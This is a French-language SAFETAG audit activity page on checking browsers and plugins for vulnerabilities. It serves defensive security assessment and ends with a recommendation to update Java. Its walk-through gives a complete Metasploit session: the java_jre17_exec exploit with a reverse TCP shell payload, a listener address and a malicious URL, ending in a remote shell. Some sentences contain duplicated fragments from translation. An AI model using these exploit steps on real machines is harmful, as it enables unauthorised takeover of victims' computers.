---
title: Vérifier les vulnérabilités des navigateurs et des plugins
position: 50
approaches:
  - Technique
authors:
  - SAFETAG
skills_trained: []
remote_options:
  - avec assistance
time_required_minutes: 30
organization_size_under: 25
summary: |
  Bien que les navigateurs modernes soient plus aptes à s'auto-actualiser, et que la prévalence des
  puissants plugins comme flash et java diminue lentement, il est important de
  que les navigateurs utilisés disposent de plugins mis à jour et sont eux-mêmes
  mis à jour.
short_summary: S'assurer que les navigateurs utilisés ont des plugins mis à jour et sont eux-mêmes mis à jour.
materials_needed: |
  * Metasploit
walk_through: |
  ###### Plugins de navigateur Java obsolètes

  Bien que la menace décrite ci-dessous soit plus grave si elle est exécutée par un attaquant
  local (car il peut plus facilement diriger la victime vers un site Web malveillant),
  elle fonctionne également à distance. En effet, si un utilisateur peut être incité, par un attaquant distant, à cliquer sur un site Web malveillant, il est possible de le faire à distance.
  un attaquant distant, à cliquer sur un courriel ou un lien Web malveillant, les attaques de ce type
  représentent une menace importante pour le périmètre. En compromettant la machine
  de la victime, elles peuvent donner à l'attaquant un point de présence local
  sans que l'attaquant ait à craquer les clés WPA ou à obtenir un accès local d'une autre manière.

  Étape 1 : En utilisant Metasploit, un attaquant peut facilement créer un site Web malveillant 
  ad hoc :

  ```
  $ msfconsole

  I love shells --egypt

   =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
  + -- --=[ 1114 exploits - 627 auxiliary - 178 post
  + -- --=[ 307 payloads - 30 encoders - 8 nops

  msf > use exploit/multi/browser/java_jre17_exec

  msf exploit(java_jre17_exec) > set PAYLOAD java/shell/reverse_tcp
  PAYLOAD => java/shell/reverse_tcp

  msf exploit(java_jre17_exec) > set LHOST 192.168.1.123
  LHOST => 192.168.1.123

  msf exploit(java_jre17_exec) > set SRVPORT 8081
  SRVPORT => 8081

  msf exploit(java_jre17_exec) > set URIPATH java_test
  URIPATH => java_test

  msf exploit(java_jre17_exec) > run
  [*] Exploit running as background job.
  ```

  Étape 2 : À ce stade, tout utilisateur local qui visite
  http://192.168.1.123:8081/java_test, et qui utilise une version suffisamment
  ancienne du plugin Java, a de bonnes chances de donner à l'attaquant
  un accès complet à son ordinateur :

  ```
  [*] Started reverse handler on 192.168.1.123:4444

  msf exploit(java_jre17_exec) |

  [*] Using URL: http://0.0.0.0:8081/java_test
  [*] Local IP: http://192.168.1.123:8081/java_test
  [*] Server started.

  msf exploit(java_jre17_exec) |

  <remote shell|
  ```

  Figure 1 : L'attaquant contrôle l'ordinateur de la victime par le biais d'un shell 
  de commande à distance
considerations: ""
skills_required: []
overview: Utiliser des méthodes d'accès direct, d'interview, de walk-throughs ou de tests de pénétration pour identifier les navigateurs vulnérables.
recommendations: |
  **Exemple de recommandation pour Java obsolète**".

  Il a été constaté qu'un ou plusieurs ordinateurs portables de l'organisation utilisaient une version obsolète, et connue comme vulnérable du plugin Java pour Internet Explorer.

  Cette version contient une vulnérabilité qui est facilement exploitable en utilisant l'un des modules d'exploitation Java récents du cadre d'audit de sécurité Metasploit largement disponible.
  Ces modules permettent à un attaquant de prendre le contrôle complet
  sur l'ordinateur d'une victime qui visite un site Web malveillant hébergé n'importe où
  sur l'Internet. Si l'attaquant se trouve dans le réseau local du bureau, il peut facilement
  facilement inciter la victime à visiter ce site Web malveillant sans qu'elle le sache.
  qu'elle le sache.

  Au moins un des ordinateurs de l'organisation utilise un plugin Java obsolète pour 
  le navigateur, et un code d'exploitation est largement disponible pour plusieurs vulnérabilités critiques
  dans les versions antérieures à "Java 7, mise à jour 16". Toutes les 
  installations Java de l'organisation doivent être mises à jour vers la dernière version.
  Cela peut poser problème, car (contrairement au système d'exploitation Windows lui-même) les plugins Java
  doivent parfois être saisis par l'utilisateur avant d'installer les mises à jour.
---
